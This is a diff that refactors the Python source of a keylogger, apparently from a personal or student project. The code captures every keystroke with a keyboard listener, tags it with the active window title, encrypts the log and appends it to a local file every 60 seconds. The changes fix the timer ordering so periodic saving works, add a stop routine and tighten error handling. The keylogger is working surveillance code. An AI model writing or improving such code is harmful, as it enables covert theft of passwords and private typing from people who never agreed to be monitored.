@@ -11,10 +11,11 @@ class KeyloggerService:
         self.logs = {}
         self.listener = None
 
-    def get_active_window(self):
+    @staticmethod
+    def get_active_window():
         try:
             return pygetwindow.getActiveWindowTitle()
-        except:
+        except (pygetwindow.PyGetWindowException, AttributeError):
             return "Unknown"
 
     def on_press(self, key):
@@ -61,20 +62,18 @@ class FileWriter(Writer):
         self.path = r"C:\Users\st\KeyloggerProject\appdata1.txt"
 
 
-
     def writer(self,data):
-        with open(self.path, "a") as logfile:
-            if isinstance(data, dict):
-                for key in data:
-                    logfile.write(f"--{key}--")
-                    logfile.write("\n")
-                    all_data = "".join(data[key])
-                    logfile.write(all_data)
-                    logfile.write("\n")
-            else:
-                logfile.write("\n")
-                logfile.write(data)
-                logfile.write("\n")
+        try:
+            with open(self.path, "a") as logfile:
+                if isinstance(data, dict):
+                    for key in data:
+                        logfile.write(f"\n--{key}--\n")
+                        logfile.write("".join(data[key]))
+                        logfile.write("\n")
+                else:
+                    logfile.write(f"\n{data}\n")
+        except IOError:
+            pass
 
 class Encryptor:
     @staticmethod
@@ -101,7 +100,10 @@ class KeyloggerManager:
         dt = datetime.datetime.now()
         return dt.strftime('***** %d/%m/%Y %H:%M *****')
 
+
     def save_data(self):
+        if not self.keylogger_service.logs:
+            return
         encrypt_data = self.encryption.encrypt(self.keylogger_service.logs)
         self.filewriter.writer(self.start_time)
         self.filewriter.writer(encrypt_data)
@@ -109,22 +111,23 @@ class KeyloggerManager:
         self.start_time = KeyloggerManager.get_time()
 
 
-
     def start_logging(self):
         self.start_time = KeyloggerManager.get_time()
-        with keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release) as self.listener:
-            self.listener.join()
         self.timer = Timer(interval=60,function=self.save_data)
         self.timer.start()
+        with keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release) as self.listener:
+            self.listener.join()
+
+    def stop_logging(self):
+        if self.timer:
+            self.timer.cancel()
+        if self.listener:
+            self.listener.stop()
+        self.save_data()
 
 
 
 
-
-# s = KeyloggerService()
-# s.start_listener()
-test = KeyloggerManager()
-test.start_logging()
 
 
 
